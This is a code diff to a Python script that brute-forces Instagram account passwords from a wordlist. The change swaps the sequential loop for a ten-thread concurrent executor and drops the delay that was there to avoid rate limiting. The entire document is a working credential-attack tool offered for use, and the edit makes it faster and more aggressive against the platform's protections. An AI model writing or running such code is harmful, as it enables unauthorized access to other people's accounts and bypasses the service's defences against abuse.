@@ -3,6 +3,7 @@ import time
 import sys
 from datetime import datetime
 from colorama import init, Fore, Style
+import concurrent.futures
 
 # Initialize colorama
 init(autoreset=True)
@@ -55,6 +56,16 @@ def instagram_login(username, password):
         print(Fore.RED + f"[-] Unexpected error: {e}")
         return False
 
+def try_password(username, password):
+    print(Fore.YELLOW + f"[+] Trying: {password}", end=" | ", flush=True)
+    
+    if instagram_login(username, password):
+        print(Fore.GREEN + f"[+] Login successful for {username}:{password}")
+        return True
+    else:
+        print(Fore.RED + f"Status = [Fail]")
+        return False
+
 def main():
     username = input("Enter Instagram username to bruteforce: ")
     password_file = "passwords.txt"
@@ -69,30 +80,17 @@ def main():
     print(Fore.GREEN + f"[*] Starting bruteforce attack on {username}")
     print(Fore.GREEN + f"[*] Loaded {len(passwords)} passwords from {password_file}")
 
-    for password in passwords:
-        try:
-            # Password attempt
-            print(Fore.YELLOW + f"[+] Trying: {password}", end=" | ", flush=True)
-            
-            if instagram_login(username, password):
-                print(Fore.GREEN + f"[+] Login successful for {username}:{password}")
+    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
+        # Map the try_password function to all passwords and submit them concurrently
+        results = {executor.submit(try_password, username, password): password for password in passwords}
+
+        for future in concurrent.futures.as_completed(results):
+            if future.result():  # If the login is successful
+                print(Fore.GREEN + "[*] Bruteforce attack completed.")
                 break
-            else:
-                print(Fore.RED + f"Status = [Fail]")  # Failed login status
 
-            time.sleep(1)  # Add a delay to avoid rate limiting
-
-        except requests.exceptions.RequestException as e:
-            print(Fore.RED + f"[-] Network error occurred: {e}")
-            time.sleep(30)  # Wait for 30 seconds before retrying
-        except KeyboardInterrupt:
-            print("\n[!] Bruteforce attack interrupted by user.")
-            sys.exit(0)
-        except Exception as e:
-            print(Fore.RED + f"[-] An unexpected error occurred: {e}")
-            time.sleep(10)  # Wait for 10 seconds before continuing
-
-    print(Fore.GREEN + "[*] Bruteforce attack completed.")
+    print(Fore.GREEN + "[*] Attack finished or interrupted.")
 
 if __name__ == "__main__":
-    main() 
+    main()
+        
